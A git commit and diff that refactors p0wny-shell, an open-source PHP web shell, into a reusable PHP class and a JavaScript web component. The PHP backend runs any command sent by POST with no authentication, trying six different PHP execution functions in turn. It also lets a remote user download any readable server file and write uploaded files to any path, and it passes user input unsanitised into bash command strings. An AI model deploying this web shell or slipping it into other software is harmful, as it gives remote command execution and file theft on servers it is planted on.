052d33cbc1cf0087528f914dada13087e3875d9d
Andreas Gohr <andi@splitbrain.org>
2023-06-29 17:39:46 +0200

    Make the tool reusable
    This splits the code into three parts:
    
    P0wnyShell.php - This contains the backend code. It has been refactored
    into a reusable class. Docblocks for some type hinting have been added,
    regexes slightly simplified.
    
    P0wnyShell.js - This contains the frontend JavaScript code. It has been
    refactored into a self contained web component with all functionality
    moved into a shadow dom. Replacement based HTML escaping has been removed
    in favor of proper textContent assignment and thus letting the browser
    do the escaping. Regexes have been slightly simplified. JavaScript has
    been modernized. Still to do: use async/await instead of manual promise
    handling
    
    P0wnyShell.css - The CSS for the web component. This is currently mostly
    as it was. This should be reorganized, so that all visual settings of
    the web component can be configured via CSS variables.
    
    The goal of these changes is it to make it easier to reuse the shell
    component in other projects. It's now relatively straight forward to
    inherit from P0wnyShell.php to implement custom authentication and add
    the shell interface within any other web framework by simply
    initializing the webcomponent with the appropriate backend attribute.

---
+++ P0wnyShell.js
@@ -0,0 +1,393 @@
+class P0wnyShell extends HTMLElement {
+
+    cwd = null;
+    commandHistory = [];
+    historyPosition = 0;
+
+    userName = 'p0wny';
+    hostName = 'shell';
+
+    backend = '';
+
+    eRoot = null;
+    eShellCmdInput = null;
+    eShellContent = null;
+    eShellPrompt = null;
+
+    /**
+     * Constructor
+     *
+     * Creates the shadow root and attaches the event listeners
+     */
+    constructor() {
+        super();
+
+        this.eRoot = this.attachShadow({mode: 'open'});
+        this.eRoot.innerHTML = `
+            <style>
+                @import "P0wnyShell.css";
+            </style>
+            <div id="shell">
+                <pre id="shell-content">
+                    <div id="shell-logo"><div><slot></slot></div></div>
+                </pre>
+                <div id="shell-input">
+                    <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
+                    <div>
+                        <input id="shell-cmd" name="cmd" />
+                    </div>
+                </div>
+            </div>
+        `;
+
+        this.eShellCmdInput = this.eRoot.querySelector('#shell-cmd');
+        this.eShellContent = this.eRoot.querySelector('#shell-content');
+        this.eShellPrompt = this.eRoot.querySelector('#shell-prompt');
+        this.eShellCmdInput.addEventListener('keydown', this.onShellCmdKeyDown.bind(this));
+
+        // click into the shell to focus the input (unless selecting)
+        this.eRoot.addEventListener('click', function (event) {
+            const selection = window.getSelection();
+            if (!selection.toString()) {
+                this.eShellCmdInput.focus();
+            }
+        }.bind(this));
+    }
+
+    /**
+     * Called when the shadow DOM has been attached to the element
+     */
+    connectedCallback() {
+        this.userName = this.getAttribute('username') || this.userName;
+        this.hostName = this.getAttribute('hostname') || this.hostName;
+        this.backend = this.getAttribute('backend') || this.backend;
+
+        this.updateCwd();
+        this.eShellCmdInput.focus();
+
+        // fetch real username and hostname from backend
+        this.makeRequest('?feature=userhost', {}, function (response) {
+            this.userName = response.username || this.userName;
+            this.hostName = response.hostname || this.hostName;
+            this.updateCwd();
+        }.bind(this));
+    }
+
+    /**
+     * Add a new command to the shown shell
+     *
+     * @param {string} command
+     */
+    insertCommand(command) {
+        this.eShellContent.innerHTML += "\n\n";
+
+        const promptSpan = document.createElement('span');
+        promptSpan.classList.add('shell-prompt');
+        this.updatePrompt(this.cwd, promptSpan);
+        this.eShellContent.appendChild(promptSpan);
+
+        const commandSpan = document.createElement('span');
+        commandSpan.textContent = command;
+        this.eShellContent.appendChild(commandSpan);
+
+        this.eShellContent.innerHTML += "\n";
+        this.eShellContent.scrollTop = this.eShellContent.scrollHeight;
+    }
+
+    /**
+     * Add command output to the shown shell
+     *
+     * @param {string} stdout
+     */
+    insertStdout(stdout) {
+        const textElem = document.createTextNode(stdout);
+        this.eShellContent.appendChild(textElem);
+        this.eShellContent.scrollTop = this.eShellContent.scrollHeight;
+    }
+
+    /**
+     * Simple method to decouple a given callback from the main thread
+     *
+     * @param {function} callback
+     */
+    defer(callback) {
+        setTimeout(callback, 0);
+    }
+
+    /**
+     * Handle an entered shell command
+     *
+     * Commands may be executed directly or passed to the backend
+     *
+     * @param command
+     */
+    featureShell(command) {
+        this.insertCommand(command);
+
+        if (/^\s*upload\s+\S+\s*$/.test(command)) {
+            // pass to upload feature
+            this.featureUpload(command.match(/^\s*upload\s+(\S+)\s*$/)[1]);
+        } else if (/^\s*clear\s*$/.test(command)) {
+            // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
+            this.eShellContent.innerHTML = '';
+        } else {
+            // send to backend
+            this.makeRequest("?feature=shell", {cmd: command, cwd: this.cwd}, function (response) {
+                if (response.hasOwnProperty('file')) {
+                    this.featureDownload(atob(response.name), response.file)
+                } else {
+                    this.insertStdout(atob(response.stdout));
+                    this.updateCwd(atob(response.cwd));
+                }
+            }.bind(this));
+        }
+    }
+
+    /**
+     * Handle tab auto completion
+     */
+    featureHint() {
+        if (this.eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete
+
+
+        const currentCmd = this.eShellCmdInput.value.split(" ");
+        const type = (currentCmd.length === 1) ? "cmd" : "file";
+        const fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];
+
+        this.makeRequest(
+            "?feature=hint",
+            {
+                filename: fileName,
+                cwd: this.cwd,
+                type: type
+            },
+            function (data) {
+                if (data.files.length <= 1) return;  // no completion
+                data.files = data.files.map(function (file) {
+                    return atob(file);
+                });
+                if (data.files.length === 2) {
+                    if (type === 'cmd') {
+                        self.eShellCmdInput.value = data.files[0];
+                    } else {
+                        const currentValue = this.eShellCmdInput.value;
+                        this.eShellCmdInput.value = currentValue.replace(/(\S*)$/, data.files[0]);
+                    }
+                } else {
+                    this.insertCommand(this.eShellCmdInput.value);
+                    this.insertStdout(data.files.join("\n"));
+                }
+            }.bind(this)
+        );
+
+    }
+
+    /**
+     * Make the browser download a file using a data URI
+     *
+     * @param {string} name Name of the file to download
+     * @param {string} file Base64 encoded file content
+     */
+    featureDownload(name, file) {
+        const element = document.createElement('a');
+        element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
+        element.setAttribute('download', name);
+        element.style.display = 'none';
+
+        this.eRoot.appendChild(element);
+        element.click();
+        this.eRoot.removeChild(element);
+        this.insertStdout('Done.');
+    }
+
+    /**
+     * Upload a file to the server
+     *
+     * @todo use await/async
+     * @param {string} path Path to upload the file to (relative to current working directory)
+     */
+    featureUpload(path) {
+        const element = document.createElement('input');
+        element.setAttribute('type', 'file');
+        element.style.display = 'none';
+        document.body.appendChild(element);
+        element.addEventListener('change', function () {
+            const promise = this.getBase64(element.files[0]);
+            promise.then(
+                function (file) {
+                    this.makeRequest(
+                        '?feature=upload',
+                        {path: path, file: file, cwd: this.cwd},
+                        function (response) {
+                            this.insertStdout(atob(response.stdout));
+                            this.updateCwd(atob(response.cwd));
+                        }.bind(this)
+                    );
+                }.bind(this),
+                function () {
+                    this.insertStdout('An unknown client-side error occurred.');
+                }.bind(this)
+            );
+        }.bind(this));
+        element.click();
+        document.body.removeChild(element);
+    }
+
+    /**
+     * Get the base64 representation of a file
+     *
+     * @todo make async instead of promise
+     * @param file
+     * @returns {Promise<unknown>}
+     */
+    getBase64(file) {
+
+        return new Promise(function (resolve, reject) {
+            const reader = new FileReader();
+            reader.onload = function () {
+                resolve(reader.result.match(/base64,(.*)$/)[1]);
+            };
+            reader.onerror = reject;
+            reader.readAsDataURL(file);
+        });
+    }
+
+    /**
+     * Update the current working directory
+     *
+     * @param {string|null} cwd
+     */
+    updateCwd(cwd = null) {
+        if (cwd) {
+            this.cwd = cwd;
+            this.updatePrompt();
+            return;
+        }
+        this.makeRequest("?feature=pwd", {}, function (response) {
+            this.cwd = atob(response.cwd);
+            this.updatePrompt();
+        }.bind(this));
+    }
+
+    /**
+     * Update the prompt
+     *
+     * @param {string|null} cwd The current working directory, defaults to current one
+     * @param {HTMLElement|null} element The element holding the prompt, defaults to input prompt
+     */
+    updatePrompt(cwd = null, element = null) {
+        cwd = cwd || this.cwd || "~";
+        element = element || this.eShellPrompt;
+
+        // create a short version of the current working directory
+        let shortCwd = cwd;
+        if (cwd.split("/").length > 3) {
+            const splittedCwd = cwd.split("/");
+            shortCwd = "…/" + splittedCwd[splittedCwd.length - 2] + "/" + splittedCwd[splittedCwd.length - 1];
+        }
+
+        // create the prompt elements
+        const userText = document.createTextNode(this.userName + "@" + this.hostName + ":");
+        const cwdSpan = document.createElement("span");
+        cwdSpan.title = cwd;
+        cwdSpan.textContent = shortCwd;
+        const promptText = document.createTextNode("# ");
+
+        // clear the prompt and add the elements
+        element.innerHTML = '';
+        element.appendChild(userText);
+        element.appendChild(cwdSpan);
+        element.appendChild(promptText);
+    }
+
+    /**
+     * Handle keydown event on shell command input
+     *
+     * @param {KeyboardEvent} event
+     */
+    onShellCmdKeyDown(event) {
+        switch (event.key) {
+            case "Enter":
+                this.featureShell(this.eShellCmdInput.value);
+                this.insertToHistory(this.eShellCmdInput.value);
+                this.eShellCmdInput.value = "";
+                break;
+            case "ArrowUp":
+                if (this.historyPosition > 0) {
+                    this.historyPosition--;
+                    this.eShellCmdInput.blur();
+                    this.eShellCmdInput.value = this.commandHistory[this.historyPosition];
+                    this.defer(function () {
+                        this.eShellCmdInput.focus();
+                    });
+                }
+                break;
+            case "ArrowDown":
+                if (this.historyPosition >= this.commandHistory.length) {
+                    break;
+                }
+                this.historyPosition++;
+                if (this.historyPosition === this.commandHistory.length) {
+                    this.eShellCmdInput.value = "";
+                } else {
+                    this.eShellCmdInput.blur();
+                    this.eShellCmdInput.focus();
+                    this.eShellCmdInput.value = this.commandHistory[this.historyPosition];
+                }
+                break;
+            case 'Tab':
+                event.preventDefault();
+                this.featureHint();
+                break;
+        }
+    }
+
+    /**
+     * Insert command to history
+     *
+     * @param {string} cmd
+     */
+    insertToHistory(cmd) {
+        this.commandHistory.push(cmd);
+        this.historyPosition = this.commandHistory.length;
+    }
+
+    /**
+     * Send a request to the backend
+     *
+     * @todo use fetch instead of XMLHttpRequest
+     * @param {string} url base url
+     * @param {object} params An object containing the parameters to send
+     * @param {function} callback A callback function to call when the request is done
+     */
+    makeRequest(url, params, callback) {
+        function getQueryString() {
+            const a = [];
+            for (const key in params) {
+                if (params.hasOwnProperty(key)) {
+                    a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
+                }
+            }
+            return a.join("&");
+        }
+
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", this.backend + url, true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                try {
+                    const responseJson = JSON.parse(xhr.responseText);
+                    callback(responseJson);
+                } catch (error) {
+                    alert("Error while parsing response: " + error);
+                }
+            }
+        };
+        xhr.send(getQueryString());
+    }
+
+
+}
+
+window.customElements.define('p0wny-shell', P0wnyShell);
---
+++ P0wnyShell.php
@@ -0,0 +1,315 @@
+<?php
+
+class P0wnyShell
+{
+
+    protected $logo = <<<LOGO
+X        ___                         ____      _          _ _        _  _
+ _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_
+| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|
+| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|
+| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|
+|_|                         |___/  \____/X
+LOGO;
+
+
+    /**
+     * Ask the shell to expand the given path
+     *
+     * @param string $path
+     * @return string
+     */
+    protected function expandPath($path)
+    {
+        if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
+            exec("echo $match[1]", $stdout);
+            return $stdout[0] . $match[2];
+        }
+        return $path;
+    }
+
+    /**
+     * Check that all given functions exist
+     *
+     * @param string[] $list
+     * @return bool
+     */
+    protected function allFunctionExist($list = [])
+    {
+        foreach ($list as $entry) {
+            if (!function_exists($entry)) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    /**
+     * Try to pass the given command to the shell and execute it
+     *
+     * Tries multiple ways to execute the command
+     * @param string $cmd The command to execute
+     * @return string The output
+     */
+    protected function executeCommand($cmd)
+    {
+        $output = '';
+        if (function_exists('exec')) {
+            exec($cmd, $output);
+            $output = implode("\n", (array)$output);
+        } else if (function_exists('shell_exec')) {
+            $output = shell_exec($cmd);
+        } else if ($this->allFunctionExist(['system', 'ob_start', 'ob_get_contents', 'ob_end_clean'])) {
+            ob_start();
+            system($cmd);
+            $output = ob_get_contents();
+            ob_end_clean();
+        } else if ($this->allFunctionExist(['passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'])) {
+            ob_start();
+            passthru($cmd);
+            $output = ob_get_contents();
+            ob_end_clean();
+        } else if ($this->allFunctionExist(['popen', 'feof', 'fread', 'pclose'])) {
+            $handle = popen($cmd, 'r');
+            while (!feof($handle)) {
+                $output .= fread($handle, 4096);
+            }
+            pclose($handle);
+        } else if ($this->allFunctionExist(['proc_open', 'stream_get_contents', 'proc_close'])) {
+            $handle = proc_open($cmd, [0 => ['pipe', 'r'], 1 => ['pipe', 'w']], $pipes);
+            $output = stream_get_contents($pipes[1]);
+            proc_close($handle);
+        }
+        return $output;
+    }
+
+    /**
+     * Is this running on a windows system?
+     *
+     * @return bool
+     */
+    protected function isRunningWindows()
+    {
+        return stripos(PHP_OS, "WIN") === 0;
+    }
+
+    /**
+     * Execute the given command
+     *
+     * @param string $cmd The command to execute
+     * @param string $cwd The current working directory
+     * @return array
+     */
+    public function featureShell($cmd, $cwd)
+    {
+        $stdout = "";
+
+        if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
+            chdir($this->expandPath("~"));
+        } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
+            chdir($cwd);
+            preg_match("/^\s*cd\s+(\S+)\s*(2>&1)?$/", $cmd, $match);
+            chdir($this->expandPath($match[1]));
+        } elseif (preg_match("/^\s*download\s+\S+\s*(2>&1)?$/", $cmd)) {
+            chdir($cwd);
+            preg_match("/^\s*download\s+(\S+)\s*(2>&1)?$/", $cmd, $match);
+            return $this->featureDownload($match[1]);
+        } else {
+            chdir($cwd);
+            $stdout = $this->executeCommand($cmd);
+        }
+
+        return array(
+            "stdout" => base64_encode($stdout),
+            "cwd" => base64_encode(getcwd())
+        );
+    }
+
+    /**
+     * Get the current working directory
+     *
+     * @return array
+     */
+    public function featurePwd()
+    {
+        return array("cwd" => base64_encode(getcwd()));
+    }
+
+    /**
+     * Create autocompletion hints
+     *
+     * @param string $fileName The part to complete
+     * @param string $cwd The current working directory
+     * @param string $type The type of completion (cmd or file)
+     * @return array
+     */
+    public function featureHint($fileName, $cwd, $type)
+    {
+        chdir($cwd);
+        if ($type == 'cmd') {
+            $cmd = "compgen -c $fileName";
+        } else {
+            $cmd = "compgen -f $fileName";
+        }
+        $cmd = "/bin/bash -c \"$cmd\"";
+        $files = explode("\n", shell_exec($cmd));
+        foreach ($files as &$filename) {
+            $filename = base64_encode($filename);
+        }
+        return array(
+            'files' => $files,
+        );
+    }
+
+    /**
+     * Pass a file to the browser for download
+     *
+     * @param $filePath
+     * @return array
+     */
+    public function featureDownload($filePath)
+    {
+        $file = @file_get_contents($filePath);
+        if ($file === FALSE) {
+            return array(
+                'stdout' => base64_encode('File not found / no read permission.'),
+                'cwd' => base64_encode(getcwd())
+            );
+        } else {
+            return array(
+                'name' => base64_encode(basename($filePath)),
+                'file' => base64_encode($file)
+            );
+        }
+    }
+
+    /**
+     * Save the given file to the given path
+     *
+     * @param string $path File to write, may be relative to the current working directory
+     * @param string $file Base64 encoded file contents
+     * @param string $cwd current working directory
+     * @return array
+     */
+    public function featureUpload($path, $file, $cwd)
+    {
+        chdir($cwd);
+        $f = @fopen($path, 'wb');
+        if ($f === FALSE) {
+            return array(
+                'stdout' => base64_encode('Invalid path / no write permission.'),
+                'cwd' => base64_encode(getcwd())
+            );
+        } else {
+            fwrite($f, base64_decode($file));
+            fclose($f);
+            return array(
+                'stdout' => base64_encode('Done.'),
+                'cwd' => base64_encode(getcwd())
+            );
+        }
+    }
+
+    /**
+     * Get the current user and host
+     *
+     * @return array
+     */
+    public function featureUserHost()
+    {
+        $result = [
+            'username' => '',
+            'hostname' => '',
+        ];
+
+
+        if ($this->isRunningWindows()) {
+            $username = getenv('USERNAME');
+            if ($username !== false) {
+                $result['username'] = $username;
+            }
+        } else {
+            $pwuid = posix_getpwuid(posix_geteuid());
+            if ($pwuid !== false) {
+                $result['username'] = $pwuid['name'];
+            }
+        }
+
+        $hostname = gethostname();
+        if ($hostname !== false) {
+            $result['hostname'] = $hostname;
+        }
+
+        return $result;
+    }
+
+    /**
+     * Output some minimal HTML to load the shell
+     *
+     * @return void
+     */
+    public function html()
+    {
+        $logo = trim(trim($this->logo, " \n"), "X");
+
+        echo <<<HTML
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>p0wny@shell:~#</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            width: 100vw;
+        }
+    </style>
+</head>
+<body>
+    <p0wny-shell>$logo</p0wny-shell>
+</body>
+<script src="P0wnyShell.js"></script>
+</html>
+HTML;
+    }
+
+    /**
+     * Execute the feature given in the GET parameter
+     *
+     * @return void
+     */
+    public function execute()
+    {
+        if (!isset($_GET["feature"])) die('no feature');
+
+        $response = NULL;
+        switch ($_GET["feature"]) {
+            case "shell":
+                $cmd = $_POST['cmd'];
+                if (!preg_match('/2>/', $cmd)) {
+                    $cmd .= ' 2>&1';
+                }
+                $response = $this->featureShell($cmd, $_POST["cwd"]);
+                break;
+            case "pwd":
+                $response = $this->featurePwd();
+                break;
+            case "hint":
+                $response = $this->featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
+                break;
+            case 'upload':
+                $response = $this->featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+                break;
+            case 'userhost':
+                $response = $this->featureUserHost();
+                break;
+        }
+
+        header("Content-Type: application/json");
+        echo json_encode($response);
+        exit();
+    }
+}
